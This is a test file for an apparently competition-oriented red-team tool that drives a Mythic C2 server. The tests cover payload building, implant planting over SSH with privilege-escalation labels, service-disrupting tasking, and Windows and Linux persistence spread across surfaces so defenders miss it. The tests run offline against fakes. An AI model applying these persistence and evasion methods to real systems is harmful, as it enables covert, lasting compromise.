"""The C2 layer: Mythic GraphQL mapping, callback freshness, planting, tasking.

Every test drives the client through its injected `graphql`/`http` seams, so
nothing here touches a network — which is exactly what the plan asks for: the C2
path has to be verifiable offline because the live Mythic only exists during a
comp.
"""

import base64
import json
import shutil
from pathlib import Path

import pytest

from tests.helpers import FakeSSH, base_cfg, make_ctx
from tlaloc.c2 import FakeMythic
from tlaloc.c2.implant import (WINDOWS_LAUNCHERS, WINDOWS_MECHANISMS,
                               Planter, load_manifest, payload_file)
from tlaloc.c2.mythic import MythicClient, _epoch
from tlaloc.errors import C2Error


class Seq(list):
    """A queue of responses: each call pops the next one."""


class StubHTTP:
    """A scripted Mythic: routes -> response, and records every call."""

    def __init__(self, routes):
        self.routes = routes
        self.calls = []

    def __call__(self, method, path, body, timeout):
        self.calls.append({"method": method, "path": path, "body": body})
        for (route_method, prefix), response in self.routes.items():
            if route_method == method and path.startswith(prefix):
                if isinstance(response, Seq):
                    return response.pop(0)
                return response
        raise C2Error(f"unrouted {method} {path}")


class StubGQL:
    """A scripted Mythic GraphQL endpoint: routes by a marker in the query text."""

    def __init__(self, routes):
        self.routes = routes
        self.calls = []

    def __call__(self, query, variables):
        self.calls.append({"query": query, "variables": variables})
        for marker, response in self.routes.items():
            if marker in query:
                if isinstance(response, Seq):
                    return response.pop(0)
                return response
        raise C2Error(f"unrouted query: {query[:80]}")


def c2_cfg(**over):
    cfg = base_cfg(c2={"enabled": True, "base_url": "https://mythic.example",
                       "username": "tlaloc", "operation": "comp-x",
                       "verify_tls": False, "callback_max_age_sec": 120})
    cfg["c2"].update(over)
    return cfg


def test_epoch_parses_mythic_timestamps():
    assert _epoch("2026-10-16T02:00:00Z") == _epoch("2026-10-16T02:00:00+00:00")
    assert _epoch(1770000000) == 1770000000.0
    assert _epoch(None) is None and _epoch("nonsense") is None


def test_callbacks_map_description_to_box_and_keep_freshness():
    now = 1792116000.0        # 2026-10-16T02:00:00Z, just after both check-ins
    graphql = StubGQL({"callback(": {"callback": [
        {"id": 7, "display_id": 7, "description": "web01-1", "host": "192.168.1.10",
         "user": "ubuntu", "last_checkin": "2026-10-16T01:59:30Z",
         "payload": {"payloadtype": {"name": "poseidon"}}},
        {"id": 8, "display_id": 8, "description": "db01-1", "host": "192.168.1.11",
         "user": "ubuntu", "last_checkin": "2026-10-16T01:00:00Z",
         "payload": {"payloadtype": {"name": "poseidon"}}},
    ]}})
    client = MythicClient(c2_cfg(), graphql=graphql, now=lambda: now)
    callbacks = client.callbacks()
    assert set(callbacks) == {"web01-1", "db01-1"}
    assert callbacks["web01-1"]["agent"] == "poseidon"
    fresh = client.fresh_callbacks()
    assert "web01-1" in fresh and "db01-1" not in fresh


def test_callback_row_without_a_timestamp_is_not_fresh():
    now = 1770000000.0
    graphql = StubGQL({"callback(": {"callback": [
        {"id": 1, "description": "web01-1", "last_checkin": None,
         "payload": {"payloadtype": {"name": "poseidon"}}}]}})
    client = MythicClient(c2_cfg(), graphql=graphql, now=lambda: now)
    assert client.callbacks()["web01-1"]["stale"] is True
    assert client.fresh_callbacks() == {}


def test_tasking_creates_and_polls_a_task():
    graphql = StubGQL({
        "callback(": {"callback": [
            {"id": 42, "description": "web01-1", "last_checkin": "2026-10-16T01:59:30Z"}]},
        "createTask": {"createTask": {"status": "success", "error": "", "id": 900,
                                      "display_id": 900}},
        "query Task": Seq([
            {"task": [{"id": 900, "status": "submitted", "completed": False}],
             "response": []},
            {"task": [{"id": 900, "status": "completed", "completed": True}],
             "response": [{"response_text": base64.b64encode(b"nginx stopped").decode()}]}]),
    })
    client = MythicClient(c2_cfg(), graphql=graphql, now=lambda: 1770000000.0)
    outcome = client.task("web01-1", "systemctl stop nginx", timeout=5,
                          poll_interval=0)
    assert outcome["ok"] is True and outcome["output"] == "nginx stopped"
    created = [c for c in graphql.calls if "createTask" in c["query"]][0]
    assert created["variables"] == {"callback_id": 42,
                                    "command": "systemctl stop nginx"}


def test_tasking_reports_a_missing_callback_instead_of_guessing():
    graphql = StubGQL({"callback(": {"callback": []}})
    client = MythicClient(c2_cfg(), graphql=graphql, now=lambda: 1770000000.0)
    outcome = client.task("web01-1", "id")
    assert outcome["ok"] is False and "no callback" in outcome["detail"]


def test_a_failed_task_is_not_success():
    graphql = StubGQL({
        "callback(": {"callback": [{"id": 1, "description": "web01-1",
                                    "last_checkin": "2026-10-16T01:59:30Z"}]},
        "createTask": {"createTask": {"status": "success", "error": "", "id": 5}},
        "query Task": {"task": [{"id": 5, "status": "error", "completed": True}],
                       "response": [{"response_text": base64.b64encode(b"denied").decode()}]},
    })
    client = MythicClient(c2_cfg(), graphql=graphql)
    outcome = client.task("web01-1", "id", timeout=1, poll_interval=0)
    assert outcome["ok"] is False and outcome["detail"].startswith("task error")
    assert outcome["output"] == "denied"


def test_disabled_c2_refuses_to_task():
    cfg = c2_cfg(enabled=False)
    client = MythicClient(cfg, http=StubHTTP({}), now=lambda: 0.0)
    with pytest.raises(C2Error):
        client.task("web01-1", "id")


def test_login_is_cached_on_the_client():
    http = StubHTTP({("POST", "/auth"): {"access_token": "tok"}})
    client = MythicClient(c2_cfg(), http=http, now=lambda: 0.0)
    assert client.login() == "tok"
    assert client._token == "tok"


# --- planting -----------------------------------------------------------------

FIXTURE = Path(__file__).parent / "fixtures" / "comp-min"
INTEL_FILES = ("teams.json", "boxes.json", "users.json", "box_services.json",
               "box_vulns.json", "nakon-config.json", ".deploy_state.json")


def _manifest(tmp_path, box_id="web01-1"):
    # The gate's scope comes from intel, so the fixture's team files travel with
    # the manifest — a box outside a known subnet is refused (fail closed).
    for name in INTEL_FILES:
        shutil.copy(FIXTURE / name, tmp_path / name)
    payload_dir = tmp_path / "red" / "payloads"
    payload_dir.mkdir(parents=True, exist_ok=True)
    payload = payload_dir / f"{box_id}.bin"
    payload.write_bytes(b"\x7fELF fake")
    manifest = {"comp": "comp-x", "operation": "comp-x", "transports": ["http"],
                "boxes": {box_id: {"uuid": "u-1", "file": f"{box_id}.bin",
                                   "os": "linux", "agent": "poseidon",
                                   "transport": "http"}}}
    (payload_dir / "manifest.json").write_text(json.dumps(manifest))
    return manifest


def test_manifest_is_loaded_and_payload_located(tmp_path):
    manifest = _manifest(tmp_path)
    loaded = load_manifest(tmp_path)
    assert loaded["boxes"]["web01-1"]["uuid"] == "u-1"
    assert payload_file(tmp_path, loaded["boxes"]["web01-1"]).exists()
    assert payload_file(tmp_path, {"file": "nope.bin"}) is None


def test_planter_installs_and_reports_the_callback(tmp_path):
    _manifest(tmp_path)
    ssh = FakeSSH()
    ssh.on("is-active", rc=0, out="active")
    ctx = make_ctx(tmp_path / "state", ssh=ssh)
    ctx.world.add_foothold("192.168.1.10", "ubuntu", "boxpw-1", "root")
    ctx.c2 = FakeMythic({"web01-1": {"seen_at": ctx.now(), "agent": "poseidon",
                                     "external_id": "7"}})
    planter = Planter(ctx, comp_dir=tmp_path)
    info = planter.plant("192.168.1.10", "web01-1", wait_sec=0)
    assert info["ok"] is True and info["callback_seen"] is True
    assert any("systemctl enable" in (call["cmd"] or "") for call in ssh.calls)
    assert ctx.world.callback_age("web01-1") is not None


def test_planter_records_the_install_even_without_a_callback(tmp_path):
    _manifest(tmp_path)
    ssh = FakeSSH()
    ssh.on("is-active", rc=0, out="active")
    ctx = make_ctx(tmp_path / "state", ssh=ssh)
    ctx.world.add_foothold("192.168.1.10", "ubuntu", "boxpw-1", "root")
    ctx.c2 = FakeMythic({})                      # no callback ever
    planter = Planter(ctx, comp_dir=tmp_path)
    info = planter.plant("192.168.1.10", "web01-1", wait_sec=0)
    assert info["ok"] is True and info["callback_seen"] is False
    assert "no callback" in json.dumps(info) or info["callback_seen"] is False


def test_planter_uses_an_escape_label_and_never_sudo(tmp_path):
    _manifest(tmp_path)
    ssh = FakeSSH().on("is-active", rc=0, out="active")
    ctx = make_ctx(tmp_path / "state", ssh=ssh, comp_dir=tmp_path)
    ctx.world.add_foothold("192.168.1.10", "ubuntu", "boxpw-1", "user")
    ctx.world.elevate_foothold("192.168.1.10", "escape:/usr/bin/bash -p -c")
    ctx.c2 = FakeMythic({"web01-1": {"seen_at": ctx.now(), "agent": "poseidon"}})
    from tlaloc.effects import execute
    result = execute("implant_channel", {"ip": "192.168.1.10", "box_id": "web01-1"},
                     ctx)
    assert result.ok is True, result.detail
    assert not ssh.sent("sudo -n")
    assert any(c.startswith("/usr/bin/bash -p -c 'mkdir -p /usr/local/lib/")
               for c in ssh.sent("mkdir -p /usr/local/lib/")), ssh.calls
    assert not ssh.sent("EOF"), "the unit must be staged, not heredoc'd"
    assert any(call.get("kind") == "sftp_put"
               and call["cmd"].endswith(".service") for call in ssh.calls)
    assert ctx.world.artifacts()[0]["kind"] == "c2-implant"


def test_planter_keeps_the_sudo_label(tmp_path):
    _manifest(tmp_path)
    ssh = FakeSSH().on("is-active", rc=0, out="active")
    ctx = make_ctx(tmp_path / "state", ssh=ssh)
    ctx.world.add_foothold("192.168.1.10", "ubuntu", "boxpw-1", "user")
    ctx.world.elevate_foothold("192.168.1.10", "sudo")
    info = Planter(ctx, comp_dir=tmp_path).plant("192.168.1.10", "web01-1",
                                                 wait_sec=0)
    assert info["ok"] is True, info
    assert len(ssh.sent("sudo -n")) >= 6, ssh.calls     # the six install steps (plus redundancy)
    assert not ssh.sent("sudo -n systemctl is-active"), "the final check stays plain"


def test_planter_installs_from_a_root_foothold_without_sudo(tmp_path):
    _manifest(tmp_path)
    ssh = FakeSSH().on("is-active", rc=0, out="active")
    ctx = make_ctx(tmp_path / "state", ssh=ssh)
    ctx.world.add_foothold("192.168.1.10", "ubuntu", "boxpw-1", "root")
    info = Planter(ctx, comp_dir=tmp_path).plant("192.168.1.10", "web01-1",
                                                 wait_sec=0)
    assert info["ok"] is True, info
    assert not ssh.sent("sudo")
    assert any(c.startswith("mkdir -p /usr/local/lib/")
               for c in ssh.sent("mkdir -p /usr/local/lib/"))


def test_a_failed_install_step_names_the_label_and_path(tmp_path):
    _manifest(tmp_path)
    ssh = FakeSSH().on("mkdir -p /usr/local/lib/", rc=1,
                       err="sudo: a password is required")
    ctx = make_ctx(tmp_path / "state", ssh=ssh)
    ctx.world.add_foothold("192.168.1.10", "ubuntu", "boxpw-1", "user")
    ctx.world.elevate_foothold("192.168.1.10", "sudo")
    info = Planter(ctx, comp_dir=tmp_path).plant("192.168.1.10", "web01-1",
                                                 wait_sec=0)
    assert info["ok"] is False
    assert "sudo" in info["detail"] and "/usr/local/lib/" in info["detail"], info


def test_planter_refuses_without_a_manifest_entry(tmp_path):
    _manifest(tmp_path)
    ctx = make_ctx(tmp_path / "state")
    ctx.c2 = FakeMythic({})
    planter = Planter(ctx, comp_dir=tmp_path)
    info = planter.plant("192.168.1.11", "db01-1", wait_sec=0)
    assert info["ok"] is False and "manifest" in info["detail"]


def test_implant_channel_effect_needs_the_callback_to_succeed(tmp_path):
    _manifest(tmp_path)
    ssh = FakeSSH().on("is-active", rc=0, out="active")
    # comp_dir points at the manifest; box_id is named explicitly because the
    # manifest's keys are comp-prep's, not something the agent may guess
    ctx = make_ctx(tmp_path / "state", ssh=ssh, comp_dir=tmp_path)
    ctx.world.add_foothold("192.168.1.10", "ubuntu", "boxpw-1", "root")
    ctx.c2 = FakeMythic({})
    from tlaloc.effects import execute
    result = execute("implant_channel", {"ip": "192.168.1.10", "box_id": "web01-1"},
                     ctx)
    assert result.ok is False
    assert "no callback" in result.detail
    assert ctx.world.artifacts()[0]["kind"] == "c2-implant", \
        "the install is recorded even when the channel never checked in"


def test_task_channel_attributes_an_impact_only_when_classified(tmp_path):
    ssh = FakeSSH()
    ctx = make_ctx(tmp_path / "state", ssh=ssh)
    ctx.c2 = FakeMythic({"web01-1": {"seen_at": ctx.now(), "agent": "poseidon"}})
    from tlaloc.effects import execute
    result = execute("task_channel", {"ip": "192.168.1.10",
                                      "command": "systemctl stop nginx",
                                      "service": "nginx"}, ctx)
    assert result.ok
    # no decider attached -> intent unknown -> no impact row (never a guess)
    assert ctx.world.impacts() == []
    assert ctx.c2.tasks and ctx.c2.tasks[0]["command"] == "systemctl stop nginx"


def test_task_channel_rejects_a_box_with_no_live_channel(tmp_path):
    ctx = make_ctx(tmp_path / "state")
    ctx.c2 = FakeMythic({"web01-1": {"seen_at": ctx.now() - 9999, "agent": "poseidon"}})
    from tlaloc.effects import execute
    result = execute("task_channel", {"ip": "192.168.1.10", "command": "id"}, ctx)
    assert result.ok is False and "live callback" in result.detail


class StubDecider:
    """The decision layer's command_intent answer, without a model."""

    def __init__(self, intent="takedown", source="clef", prob=0.92):
        self.intent, self.source, self.prob = intent, source, prob

    def classify_command(self, command, os_name="linux"):
        from tlaloc.decide import Decision
        return Decision("command_intent", self.intent,
                        probabilities={self.intent: self.prob}, top_prob=self.prob,
                        source=self.source)


def test_task_channel_records_the_undo_for_a_tasked_command(tmp_path):
    """A C2-tasked command is a mutation: it must carry its undo."""
    ctx = make_ctx(tmp_path / "state")
    ctx.c2 = FakeMythic({"web01-1": {"seen_at": ctx.now(), "agent": "poseidon"}})
    from tlaloc.effects import execute
    result = execute("task_channel", {"ip": "192.168.1.10",
                                      "command": "mv /etc/nginx/nginx.conf /tmp/x"}, ctx)
    assert result.ok
    table = ctx.world.restore_table()
    assert len(table) == 1, "the restore table must not lose a C2-tasked mutation"
    assert table[0]["effect"] == "task_channel"
    assert any("mv /etc/nginx/nginx.conf /tmp/x" in str(step)
               for step in table[0]["recipe"])


def test_task_channel_undo_names_the_service_it_took_down(tmp_path):
    ctx = make_ctx(tmp_path / "state")
    ctx.c2 = FakeMythic({"web01-1": {"seen_at": ctx.now(), "agent": "poseidon"}})
    ctx.decider = StubDecider(intent="takedown")
    from tlaloc.effects import execute
    result = execute("task_channel", {"ip": "192.168.1.10",
                                      "command": "systemctl stop nginx",
                                      "service": "nginx"}, ctx)
    assert result.ok and result.impact["service"] == "nginx"
    assert ctx.world.restore_table()[0]["recipe"][0] == "systemctl start nginx.service"
    assert ctx.world.restore_table()[0].get("secrets") is None


def test_a_task_that_ran_but_failed_still_records_its_undo(tmp_path):
    """ok=False with the box touched is exactly the case a record gated on a
    proof would lose (the earlier agent's implant did)."""
    class FailingC2(FakeMythic):
        def task(self, box_id, command, timeout=120):
            return {"ok": False, "detail": "task error", "output": "",
                    "task_id": 77}

    ctx = make_ctx(tmp_path / "state")
    ctx.c2 = FailingC2({"web01-1": {"seen_at": ctx.now(), "agent": "poseidon"}})
    from tlaloc.effects import execute
    result = execute("task_channel", {"ip": "192.168.1.10",
                                      "command": "systemctl stop nginx",
                                      "service": "nginx"}, ctx)
    assert result.ok is False
    table = ctx.world.restore_table()
    assert len(table) == 1 and table[0]["recipe"][0] == "systemctl start nginx.service"


def test_build_payload_carries_the_callback_address():
    graphql = StubGQL({"createPayload": {"createPayload": {
        "status": "success", "error": "", "uuid": "uuid-1"}}})
    client = MythicClient(c2_cfg(callback_host="http://172.31.2.1",
                                 callback_port=8000), graphql=graphql)
    entry = client.build_payload("web01-1", "linux", transport="http")
    definition = json.loads(graphql.calls[0]["variables"]["payload"])
    profile = definition["c2_profiles"][0]
    assert profile["c2_profile"] == "http"
    assert profile["c2_profile_parameters"] == {"callback_host": "http://172.31.2.1",
                                                "callback_port": 8000}
    assert entry["uuid"] == "uuid-1" and entry["callback"] == {"host": "http://172.31.2.1",
                                                               "port": 8000}
    assert definition["build_parameters"] == []
    assert definition["selected_os"] == "Linux" and definition["commands"] == []


def test_build_payload_without_a_callback_keeps_the_profile_default():
    """No configured callback = the profile instance's own value stays in place;
    nothing is invented (and the field is absent, not empty)."""
    graphql = StubGQL({"createPayload": {"createPayload": {
        "status": "success", "error": "", "uuid": "uuid-2"}}})
    client = MythicClient(c2_cfg(), graphql=graphql)
    client.build_payload("web01-1", "windows")
    definition = json.loads(graphql.calls[0]["variables"]["payload"])
    profile = definition["c2_profiles"][0]
    assert "c2_profile_parameters" not in profile
    assert definition["payload_type"] == "apollo"
    assert definition["selected_os"] == "Windows"


def test_download_waits_for_the_build_and_writes_the_file(tmp_path):
    graphql = StubGQL({"payload(where": Seq([
        {"payload": [{"uuid": "u1", "build_phase": "building",
                      "filemetum": {"agent_file_id": "f1"}}]},
        {"payload": [{"uuid": "u1", "build_phase": "built",
                      "filemetum": {"agent_file_id": "f1"}}]},
    ])})
    http = StubHTTP({("GET", "/direct/download/f1"): b"\x7fELF"})
    client = MythicClient(c2_cfg(), graphql=graphql, http=http, now=lambda: 0.0)
    path = tmp_path / "payload.bin"
    client.download_payload("u1", path, timeout=30)
    assert path.read_bytes() == b"\x7fELF"


def test_a_success_phase_is_a_finished_build(tmp_path):
    graphql = StubGQL({"payload(where": {"payload": [
        {"uuid": "u1", "build_phase": "success",
         "filemetum": {"agent_file_id": "f1"}}]}})
    http = StubHTTP({("GET", "/direct/download/f1"): b"\x7fELF"})
    client = MythicClient(c2_cfg(), graphql=graphql, http=http, now=lambda: 0.0)
    path = tmp_path / "p.bin"
    client.download_payload("u1", path)
    assert path.read_bytes() == b"\x7fELF"


def test_a_failed_build_is_not_a_download(tmp_path):
    graphql = StubGQL({"payload(where": {"payload": [
        {"uuid": "u1", "build_phase": "error", "build_message": "apt broke"}]}})
    client = MythicClient(c2_cfg(), graphql=graphql, now=lambda: 0.0)
    with pytest.raises(C2Error, match="apt broke"):
        client.download_payload("u1", tmp_path / "p.bin")


def test_an_empty_download_is_a_failure_not_an_artifact(tmp_path):
    graphql = StubGQL({"payload(where": {"payload": [
        {"uuid": "u1", "build_phase": "built",
         "filemetum": {"agent_file_id": "f1"}}]}})
    http = StubHTTP({("GET", "/direct/download/f1"): b""})
    client = MythicClient(c2_cfg(), graphql=graphql, http=http, now=lambda: 0.0)
    with pytest.raises(C2Error, match="0 bytes"):
        client.download_payload("u1", tmp_path / "p.bin")


def test_a_composite_manifest_key_is_found_by_box():
    from tlaloc.c2.implant import manifest_entry
    entry = {"uuid": "u-1", "file": "web01-1.bin", "transport": "http"}
    manifest = {"boxes": {"web01-1:http": entry, "web01-1:webhook": dict(entry, uuid="u-2")}}
    assert manifest_entry(manifest, "web01-1")["uuid"] == "u-1"
    assert manifest_entry(manifest, "web01-1", "http")["uuid"] == "u-1"
    assert manifest_entry(manifest, "web01-1", "webhook")["uuid"] == "u-2"
    assert manifest_entry(manifest, "web01-1", "smb")["uuid"] == "u-1"
    assert manifest_entry(manifest, "db01-1") is None


def test_the_plant_rides_the_escalated_foothold_when_sudo_is_broken(tmp_path):
    """web01's writable-sudoers makes sudo refuse; the escalated path still works."""
    _manifest(tmp_path)
    ssh = FakeSSH().on("is-active", rc=0, out="active")
    ctx = make_ctx(tmp_path / "state", ssh=ssh)
    ctx.world.add_foothold("192.168.1.10", "ubuntu", "boxpw-1", "user",
                           escalation="escape:/tmp/.x")
    ctx.c2 = FakeMythic({})
    planter = Planter(ctx, comp_dir=tmp_path)
    info = planter.plant("192.168.1.10", "web01-1", wait_sec=0)
    assert info["ok"] is True
    install = [c["cmd"] or "" for c in ssh.calls if "systemctl enable" in (c["cmd"] or "")]
    assert install, "the unit install ran"
    assert "/tmp/.x" in install[0] and "sudo -n" not in install[0]


def test_the_windows_plant_varies_its_persistence_surfaces(tmp_path):
    """One ONSTART SYSTEM task is a one-look IOC: blue finds it and the board is
    clean in a minute. Each plant draws a launcher plus one or two redundant
    mechanisms from OTHER surfaces (registry, WMI, IFEO, Active Setup, startup),
    and the plant's undo covers every surface it touched."""
    _manifest(tmp_path)
    out = ("SUCCESS: The scheduled task \"X\" has successfully been created.\r\n")
    ssh = FakeSSH().on("schtasks /Create", rc=0, out=out)
    ssh.on("tasklist", rc=0, out="web01-1.exe  1234  Console  1  10,000 K\r\n")
    ctx = make_ctx(tmp_path / "state", ssh=ssh)
    ctx.world.add_foothold("192.168.1.20", "Administrator", "pw", "admin", windows=True)
    planter = Planter(ctx, comp_dir=tmp_path)
    payload = tmp_path / "dc01.bin"
    payload.write_bytes(b"MZ fake")

    seen = set()
    for seed in range(12):
        ctx.rng.seed(seed)
        info = planter._install_windows("192.168.1.20", "web01-1", payload, "http")
        assert info["ok"] is True, info["detail"]
        mechs = info["mechanisms"]
        assert mechs[0] in WINDOWS_LAUNCHERS
        assert len(mechs) >= 2, "a plant carries a redundant surface too"
        assert all(m in WINDOWS_MECHANISMS for m in mechs)
        assert len(info["undo"]) >= len(mechs), "every surface has an undo"
        assert len(set(mechs)) == len(mechs), mechs
        seen.add(tuple(mechs))

    launchers = {ms[0] for ms in seen}
    assert len(launchers) >= 3, f"launchers stay diverse across plants: {launchers}"
    assert len(seen) >= 3


def test_the_linux_plant_adds_a_surface_beyond_the_unit(tmp_path):
    """A lone systemd unit is the first grep a defender runs. The plant draws a
    second surface (cron watchdog or login hook), and the undo names both."""
    _manifest(tmp_path)
    payload = tmp_path / "web01-1.bin"
    payload.write_bytes(b"\x7fELF fake")
    ssh = FakeSSH().on("is-active", rc=0, out="active")
    ctx = make_ctx(tmp_path / "state", ssh=ssh)
    ctx.world.add_foothold("192.168.1.10", "ubuntu", "boxpw-1", "root")
    planter = Planter(ctx, comp_dir=tmp_path)

    seen = set()
    for seed in range(8):
        ctx.rng.seed(seed)
        info = planter._install_linux("192.168.1.10", "web01-1", payload, "http")
        assert info["ok"] is True, info
        assert len(info["mechanisms"]) >= 2, info
        extra = [p for p in info["paths"]
                 if "/etc/cron.d/" in p or "/etc/profile.d/" in p]
        assert extra, info
        assert any(extra[0] in u for u in info["undo"]), info
        seen.update(info["mechanisms"])
    assert {"systemd", "cron_watch", "profile_hook"} <= seen, seen


def test_task_persistence_launches_through_a_single_instance_stub(tmp_path):
    """A bare /TR starts another copy on every re-plant: the live range ended up
    with ten live agents per Windows box. Tasks run a stub that checks for the
    image first, so the surfaces coalesce on one process."""
    import base64
    _manifest(tmp_path)
    payload = tmp_path / "dc01.bin"
    payload.write_bytes(b"MZ")
    ssh = FakeSSH().on("schtasks /Create", rc=0, out="SUCCESS")
    ssh.on("tasklist", rc=0, out="dc01-1.exe  1234  Services  0  10,000 K")
    ctx = make_ctx(tmp_path / "state", ssh=ssh)
    ctx.world.add_foothold("192.168.1.20", "Administrator", "pw", "admin", windows=True)
    planter = Planter(ctx, comp_dir=tmp_path)

    info = None
    for seed in range(12):
        ctx.rng.seed(seed)
        info = planter._install_windows("192.168.1.20", "dc01-1", payload, "http")
        if any(m.startswith("task_") for m in info["mechanisms"]):
            break
    else:
        raise AssertionError("no seed drew a task launcher")

    created = [c["cmd"] for c in ssh.calls if "schtasks /Create" in (c["cmd"] or "")]
    assert created and '/TR "cmd /c' in created[-1]
    decoded = [base64.b64decode(c["cmd"].split("-EncodedCommand ")[1].strip())
               .decode("utf-16-le")
               for c in ssh.calls if "-EncodedCommand" in (c["cmd"] or "")]
    assert any("-run.cmd" in d and "tasklist" in d for d in decoded), "stub written"
    assert any("-run.cmd" in u for u in info["undo"]), info["undo"]


def test_the_immediate_start_is_detached_from_the_ssh_session(tmp_path):
    """Children of an OpenSSH session are killed with it. `start /b` was the
    plant's own proof: the process existed while the plant looked and was gone by
    the next command, so the start goes through Win32_Process.Create."""
    import base64
    _manifest(tmp_path)
    payload = tmp_path / "dc01.bin"
    payload.write_bytes(b"MZ")
    ssh = FakeSSH().on(
        "tasklist", rc=0,
        out="INFO: No tasks are running which match the specified criteria.")
    ctx = make_ctx(tmp_path / "state", ssh=ssh)
    ctx.world.add_foothold("192.168.1.20", "Administrator", "pw", "admin", windows=True)
    Planter(ctx, comp_dir=tmp_path)._install_windows("192.168.1.20", "dc01-1",
                                                     payload, "http")
    bodies = [base64.b64decode(c["cmd"].split("-EncodedCommand ")[1].strip())
              .decode("utf-16-le")
              for c in ssh.calls if "-EncodedCommand" in (c["cmd"] or "")]
    assert any("Win32_Process" in d and "Create" in d for d in bodies), \
        "the one-shot start should spawn under the WMI service, not the ssh session"
